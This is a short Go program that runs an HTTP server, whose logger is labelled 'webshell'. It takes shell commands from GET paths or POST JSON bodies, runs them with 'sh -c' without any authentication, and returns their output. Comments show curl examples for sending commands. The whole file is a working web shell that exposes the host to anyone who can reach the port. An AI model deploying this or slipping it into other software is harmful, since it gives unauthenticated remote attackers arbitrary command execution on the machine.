package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strings"

	"github.com/gorilla/mux"
)

type commandJSON struct {
	Cmd string `json:"command"`
}

type Handlers struct {
	logger *log.Logger
}

func NewHandlers(logger *log.Logger) *Handlers {
	return &Handlers{
		logger: logger,
	}
}

func (h *Handlers) handleRequests() {
	servicePort := os.Getenv("SERVICE_ADDR")
	myRouter := mux.NewRouter()
	myRouter.HandleFunc("/{key}", h.commandExecute).Methods("GET")
	myRouter.HandleFunc("/", h.commandExecute).Methods("POST")
	h.logger.Printf("Listening for HTTP requests on 'localhost:%s'\n", servicePort)
	h.logger.Fatal(http.ListenAndServe(":"+servicePort, myRouter))
}

// ServeGET formats comma separated string to command string
func ServeGET(r *http.Request) (string, error) {
	// DOESN'T WORK >> curl localhost:5000/python,-c,"print('foo')"
	// curl localhost:5000/python,-c,\'print\(\"foo\"\)\'
	// curl localhost:5000/pwd
	// curl localhost:5000/ps, -ef

	// WITH prefix
	// GETCommand := strings.Replace(r.URL.Path, "/api/v1/", "", 1)
	// WITHOUT prefix
	GETCommand := strings.Replace(r.URL.Path, "/", "", 1)

	len := len(GETCommand)
	var args []string
	if len > 1 {
		args = strings.Split(GETCommand, ",")
	} else {
		args = append(args, "ls")
		args = append(args, "-al")
	}
	var command string
	command = fmt.Sprintf("/usr/bin/which")
	out, err := exec.Command(command, args[0]).Output()
	if err != nil {
		return "", err
	}
	realCommand := strings.Split(string(out), "\n")[0]
	args[0] = realCommand
	return fmt.Sprintf("%s", strings.Join(args, " ")), nil
}

// ServePOST unmarshalls string from JSON POST
func ServePOST(r *http.Request) (string, error) {
	// curl -X POST localhost:5000/ -d '{"command" : "python test.py"}'
	// curl -X POST localhost:5000/ -d '{"command":"python3 -c \"print(\\\"foo\\\")\" "}'

	// fmt.Println(r.Form)
	// output: map[{"command" : "python test.py"}:[]]

	var comStruct commandJSON
	for key := range r.Form {
		err := json.Unmarshal([]byte(key), &comStruct)
		if err != nil {
			return "", err
		}
	}
	return comStruct.Cmd, nil
}

func (h *Handlers) commandExecute(w http.ResponseWriter, r *http.Request) {
	var command string
	var err error
	r.ParseForm()
	ServeGET(r)
	if r.Method == "GET" {
		command, err = ServeGET(r)
		if err != nil {
			errorString := fmt.Sprintf("\nError while executing 'which' command: %s\n", err)
			fmt.Print(errorString)
			fmt.Fprint(w, errorString)
		}
	} else if r.Method == "POST" {
		command, err = ServePOST(r)
		if err != nil {
			errorString := fmt.Sprintf("\nError while parsing POST data: %s\n", err)
			fmt.Print(errorString)
			fmt.Fprint(w, errorString)
		}
	}
	outputHeader := fmt.Sprintf("Command:\t%s\n", command)
	outCommand, err := exec.Command("sh", "-c", command).Output()
	if err != nil {
		errorString := fmt.Sprintf("\nError in command exec: %s\n", err)
		fmt.Printf(errorString)
		fmt.Fprintf(w, errorString)
	}
	h.logger.Printf("Command: %s", command)
	formattedOutput := fmt.Sprintf("\nMethod:\t\t%s\n%sResult:\n\n%s\n", r.Method, outputHeader, string(outCommand))
	fmt.Fprintf(w, formattedOutput)
}

func main() {
	logger := log.New(os.Stdout, "webshell ", log.LstdFlags|log.Lshortfile|log.Ltime|log.LUTC)
	s := NewHandlers(logger)
	s.handleRequests()
}
